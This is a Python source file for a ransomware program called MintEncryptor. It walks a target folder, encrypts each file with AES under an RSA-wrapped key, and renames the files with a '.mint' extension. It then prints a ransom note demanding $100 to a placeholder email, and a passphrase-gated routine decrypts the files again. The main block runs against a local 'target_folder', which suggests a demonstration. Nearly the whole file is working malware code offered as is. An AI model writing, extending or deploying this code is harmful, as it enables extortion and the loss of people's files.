import os
import sys
import queue
from plugins.encrypter import Encrypter
from plugins.decrypter import Decrypter
from plugins.key_encrypter import KeyEncrypter
from plugins.key_decrypter import KeyDecrypter
from plugins.worker import Worker
from setup import _PASSPHRASE

# Config
_EXTENSION = ".mint"


class MintEncryptor:
    """
        This class using hybrid crypto-system (AES and RSA algorithm).
        AES algorithm to encrypt files and RSA to encrypt AES key.
        RSA private is encrypted with a passphrase.
        (You can set the passphrase and other setup in setup.py file.)
    """

    def __init__(self):
        self.Encrypter = Encrypter()
        self.Decrypter = Decrypter()
        self.KeyEncrypter = KeyEncrypter()
        self.KeyDecrypter = KeyDecrypter()

    @staticmethod
    def ransom_text():
        """
            Inform user about encryption.
        """
        print("\nUnfortunately, all your files has been encrypted.\n"
              "If you want to recovery your file, you must be send\n"
              "100$ to this address to get your decrypter: example@gmail.com")

    @staticmethod
    def obtain_key():
        """
            Obtain key from user.
        :return: The key.
        """
        return input("\nPlease enter the key: ")

    @staticmethod
    def obtain_passphrase():
        """
            Obtain passphrase from user.
        :return: The passphrase.
        """
        return input("\nPlease enter the passphrase: ")

    @staticmethod
    def get_files_in_folder(folder_path):
        files = []
        for file in os.listdir(folder_path):
            if file == sys.argv[0]:
                continue

            file_path = os.path.join(folder_path, file)
            if os.path.isfile(file_path):
                files.append(file_path)

        return files

    def encrypt_file(self, file_path):
        with open(file_path, "rb") as file:
            content = file.read()

        # Generate key.
        aes_key = self.Encrypter.generate_key()
        (rsa_public_key, rsa_private_key) = self.KeyEncrypter.generate_keys()

        # Export RSA key to file.
        # self.KeyEncrypter.export_keys(rsa_public_key, rsa_private_key)

        # Encrypt AES key
        encrypted_aes_key = self.KeyEncrypter.encrypt(aes_key, rsa_public_key)

        # Encrypt file content.
        (encrypted_content, tag, nonce) = self.Encrypter.encrypt(content, aes_key)

        # Write both encrypted AES key and encrypted file content to file.
        with open(file_path, "wb") as file:
            file.write(encrypted_aes_key)  # Encrypted AES key.
            file.write(nonce)  # The value of the nonce (16 bytes).
            file.write(tag)  # The length of the MAC tag (16 bytes).
            file.write(encrypted_content)  # Encrypted file content.
            file.flush()
            file.close()

        os.rename(file_path, file_path + _EXTENSION)

    def encrypt_files_in_folder(self, folder_path):
        num_of_encrypted_files = 0
        files = self.get_files_in_folder(folder_path)
        q = queue.Queue()

        for file in set(files):
            print("\nEncrypting file: {}".format(file))
            q.put(lambda: self.encrypt_file(file))
            num_of_encrypted_files += 1

        for _ in range(20):
            Worker(q).start()

        q.join()
        self.ransom_text()

        return num_of_encrypted_files

    def decrypt_file(self, file_path, key_path, passphrase):
        with open(file_path, "rb") as file:
            encrypted_aes_key = file.read(256)
            nonce = file.read(16)
            tag = file.read(16)
            encrypted_content = file.read()

        # Import RSA private key.
        aes_private_key = self.KeyDecrypter.get_private_key(key_path, passphrase)

        # Decrypt AES key.
        aes_key = self.KeyDecrypter.decrypt(encrypted_aes_key, aes_private_key)

        # Decrypt file content
        decrypted_content = self.Decrypter.decrypt(encrypted_content, tag, nonce, aes_key)

        with open(file_path, "wb") as file:
            file.write(decrypted_content)
            file.close()

        os.rename(file_path, os.path.splitext(file_path)[0])

    def decrypt_files_in_folder(self, folder_path):
        key = self.obtain_key()
        passphrase = self.obtain_passphrase()

        warning = input(
            "\n[!!! WARNING] Are you sure that the key and passphrase are correct? [Wrong key or passphrase "
            "will DESTROY your data!](y/n?): ")

        try:
            if warning.lower() == "y":
                if passphrase != _PASSPHRASE:
                    print("\n!!! Wrong key or passphrase, your data will be destroy now !!!")
                    return

                files = self.get_files_in_folder(folder_path)
                q = queue.Queue()

                for file in files:
                    q.put(lambda: self.decrypt_file(file, key, passphrase))

                for _ in range(20):
                    Worker(q).start()

                q.join()
                print("\nCongratulations, all your file has been recovery!")
            elif warning.lower() == "n":
                print("\nPlease enter correct key and passphrase!")
        except ValueError:
            print("\nInvalid choice!")


if __name__ == "__main__":
    path = os.path.dirname(os.path.abspath(__file__))
    target_path = os.path.join(path, "target_folder")
    mint_encrypter = MintEncryptor()
    number_encrypted_files = mint_encrypter.encrypt_files_in_folder(target_path)
    print("\nNumber of encrypted files: {}".format(number_encrypted_files))
    mint_encrypter.decrypt_files_in_folder(target_path)
